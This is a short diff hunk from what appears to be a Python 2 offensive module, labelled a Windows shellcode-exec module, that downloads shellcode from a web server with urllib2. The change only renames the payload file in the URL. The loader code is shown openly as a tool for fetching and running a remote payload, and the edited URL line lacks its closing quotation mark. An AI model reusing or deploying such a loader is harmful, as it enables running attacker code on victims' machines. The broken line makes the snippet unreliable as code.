@@ -3,7 +3,7 @@ import ctypes
 import base64
 
 def run(**args):
-    url = "http://localhost:8000/shellcode.bin
+    url = "http://localhost:8000/shell.bin
     print "[*] In shellcode exec (Windows) module."
     # retrieve the shellcode from our web server
     response = urllib2.urlopen(url)
